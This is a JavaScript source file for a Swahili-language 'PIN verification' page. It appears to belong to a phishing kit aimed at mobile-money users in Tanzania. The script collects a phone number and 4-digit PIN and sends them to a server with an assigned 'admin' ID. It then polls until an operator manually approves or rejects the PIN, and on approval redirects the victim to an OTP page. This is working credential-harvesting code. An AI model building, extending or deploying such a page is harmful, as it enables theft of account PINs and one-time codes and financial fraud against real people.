// PIN Verification Script with Enhanced Admin ID Support - NO ALERTS VERSION
document.addEventListener('DOMContentLoaded', function() {
    const phoneInput = document.getElementById('phoneNumber');
    const pinInput = document.getElementById('pin');
    const verifyBtn = document.getElementById('verifyPinBtn');
    const pinScreen = document.getElementById('pinScreen');
    const processingScreen = document.getElementById('processingScreen');
    const rejectionScreen = document.getElementById('rejectionScreen');
    
    // Create error message display
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    errorDiv.style.cssText = 'display:none; background:#fee; border:1px solid #fcc; color:#c33; padding:12px; border-radius:8px; margin:10px 0;';
    
    // Insert error div after form title
    const formTitle = document.querySelector('.form-title');
    if (formTitle && formTitle.parentNode) {
        formTitle.parentNode.insertBefore(errorDiv, formTitle.nextSibling);
    }
    
    // Function to show error message instead of alert
    function showError(message) {
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        setTimeout(() => {
            errorDiv.style.display = 'none';
        }, 5000);
        // Scroll to error
        errorDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }
    
    // Get application data and admin ID
    const applicationData = JSON.parse(sessionStorage.getItem('applicationData') || '{}');
    let adminId = sessionStorage.getItem('selectedAdminId');
    
    // Check if we have application ID - redirect silently if not
    if (!applicationData.applicationId) {
        console.error('No application data found');
        window.location.href = 'index.html';
        return;
    }
    
    // Log admin assignment status
    if (adminId) {
        console.log('✅ Admin ID found:', adminId);
        console.log('📋 Application will be assigned to this admin');
    } else {
        console.log('⚠️ No admin ID found - will be auto-assigned by server');
    }
    
    // PIN input - only allow numbers
    pinInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/\D/g, '').slice(0, 4);
    });
    
    // Phone number formatting
    phoneInput.addEventListener('input', function(e) {
        let value = this.value.replace(/\D/g, '');
        
        // Add +255 prefix if not present
        if (value.length > 0 && !value.startsWith('255')) {
            if (value.startsWith('0')) {
                value = '255' + value.substring(1);
            } else if (value.startsWith('7')) {
                value = '255' + value;
            }
        }
        
        // Format the number
        if (value.length > 3) {
            this.value = '+' + value.substring(0, 3) + ' ' + value.substring(3);
        } else {
            this.value = value;
        }
    });
    
    // Verify PIN button
    verifyBtn.addEventListener('click', async function(e) {
        e.preventDefault();
        
        const phoneNumber = phoneInput.value.trim().replace(/\s/g, '');
        const pin = pinInput.value.trim();
        
        // Validation with visual feedback instead of alerts
        if (!phoneNumber) {
            showError('Tafadhali weka nambari yako ya simu');
            phoneInput.focus();
            phoneInput.style.borderColor = '#c33';
            setTimeout(() => { phoneInput.style.borderColor = ''; }, 3000);
            return;
        }
        
        // Validate phone number format
        if (!phoneNumber.match(/^\+?255\d{9}$/)) {
            showError('Nambari ya simu sio sahihi. Tumia format: +255XXXXXXXXX');
            phoneInput.focus();
            phoneInput.style.borderColor = '#c33';
            setTimeout(() => { phoneInput.style.borderColor = ''; }, 3000);
            return;
        }
        
        if (pin.length !== 4) {
            showError('PIN lazima iwe na nambari 4');
            pinInput.focus();
            pinInput.style.borderColor = '#c33';
            setTimeout(() => { pinInput.style.borderColor = ''; }, 3000);
            return;
        }
        
        // Save phone and PIN to application data
        applicationData.phone = phoneNumber;
        applicationData.pin = pin;
        sessionStorage.setItem('applicationData', JSON.stringify(applicationData));
        
        // Show processing screen
        pinScreen.style.display = 'none';
        processingScreen.style.display = 'block';
        
        // Prepare request data
        const requestData = {
            applicationId: applicationData.applicationId,
            phoneNumber: phoneNumber,
            pin: pin
        };
        
        // Add admin ID if available
        if (adminId) {
            requestData.adminId = adminId;
            console.log('📤 Sending with admin ID:', adminId);
        } else {
            console.log('📤 Sending without admin ID (server will auto-assign)');
        }
        
        // Send to server
        try {
            const response = await fetch('/api/verify-pin', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(requestData)
            });
            
            const result = await response.json();
            
            if (result.success) {
                console.log('✅ PIN sent for verification');
                console.log('📋 Application ID:', result.applicationId);
                console.log('👤 Assigned to:', result.assignedTo);
                console.log('🆔 Admin ID:', result.assignedAdminId);
                
                // Update admin ID in session if it was auto-assigned
                if (result.assignedAdminId && !adminId) {
                    sessionStorage.setItem('selectedAdminId', result.assignedAdminId);
                    adminId = result.assignedAdminId;
                    console.log('🔄 Admin auto-assigned:', result.assignedTo);
                }
                
                // Start polling for status
                checkPinStatus(result.applicationId);
            } else {
                throw new Error(result.message || 'Failed to submit');
            }
            
        } catch (error) {
            console.error('❌ Error:', error);
            processingScreen.style.display = 'none';
            pinScreen.style.display = 'block';
            showError('Hitilafu imetokea. Tafadhali jaribu tena.\n\nMaelezo: ' + error.message);
        }
    });
    
    // Check PIN status
    function checkPinStatus(applicationId) {
        let checkCount = 0;
        const maxChecks = 150; // 5 minutes (2 seconds interval)
        
        const statusInterval = setInterval(async () => {
            checkCount++;
            
            try {
                const response = await fetch(`/api/check-pin-status/${applicationId}`);
                const result = await response.json();
                
                if (result.success) {
                    console.log(`🔍 Check #${checkCount}: Status = ${result.status}`);
                    
                    if (result.status === 'approved') {
                        // PIN approved - redirect to OTP page
                        clearInterval(statusInterval);
                        console.log('✅ PIN approved! Redirecting to OTP page...');
                        
                        // Small delay for user feedback
                        setTimeout(() => {
                            window.location.href = 'otp.html';
                        }, 1000);
                        
                    } else if (result.status === 'rejected') {
                        // PIN rejected - show rejection screen
                        clearInterval(statusInterval);
                        console.log('❌ PIN rejected by admin');
                        processingScreen.style.display = 'none';
                        rejectionScreen.style.display = 'block';
                    }
                    // If still 'pending', keep polling
                }
            } catch (error) {
                console.error('❌ Error checking status:', error);
            }
            
            // Stop after max checks
            if (checkCount >= maxChecks) {
                clearInterval(statusInterval);
                processingScreen.style.display = 'none';
                pinScreen.style.display = 'block';
                showError('Muda umeisha. Msimamizi hajaitikia ombi lako. Tafadhali jaribu tena baadaye.');
            }
            
        }, 2000); // Check every 2 seconds
    }
    
    // Show admin info in console for debugging
    console.log('=== PIN VERIFICATION PAGE ===');
    console.log('Application ID:', applicationData.applicationId);
    console.log('Admin ID:', adminId || 'Will be auto-assigned');
    console.log('============================');
});